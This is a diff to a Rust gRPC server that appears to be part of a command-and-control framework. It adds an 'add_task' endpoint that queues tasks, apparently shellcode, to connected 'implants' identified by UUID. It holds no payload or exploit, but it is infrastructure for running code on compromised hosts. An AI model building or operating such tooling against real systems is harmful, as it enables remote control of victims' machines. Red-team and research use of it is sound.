@@ -8,7 +8,8 @@ use crate::implant::Implant;
 use crate::Task;
 
 use crate::iface::{
-    self, interface_service_server::InterfaceService, ClientListRequest, ClientListResponse,
+    self, interface_service_server::InterfaceService, AddTaskRequest, AddTaskResponse,
+    ClientListRequest, ClientListResponse,
 };
 use crate::tasks::{
     beacon_service_server::BeaconService, ConnectionRequest, ConnectionResponse, PollRequest,
@@ -107,5 +108,31 @@ impl InterfaceService for Arc<Beacon> {
         Ok(Response::new(ClientListResponse {
             list: map.keys().map(|k| k.to_string()).collect(),
         }))
+    }
+
+    async fn add_task(
+        &self,
+        request: Request<AddTaskRequest>,
+    ) -> Result<Response<AddTaskResponse>, Status> {
+        let request = request.into_inner();
+        let id = Uuid::parse_str(&request.uuid);
+        if id.is_err() {
+            return Err(Status::invalid_argument("Failed to parse uuid."));
+        }
+
+        if request.task.is_none() {
+            return Err(Status::invalid_argument("ShellCode should not be None."));
+        }
+
+        let map = self.implants.read().await;
+        match map.get(&id.unwrap()) {
+            Some(v) => v.push_task(request.task.unwrap()).await,
+            None => {
+                return Err(Status::not_found(
+                    "Client doesn't exist or isn't connected.",
+                ))
+            }
+        }
+        Ok(Response::new(AddTaskResponse { }))
     }
 }
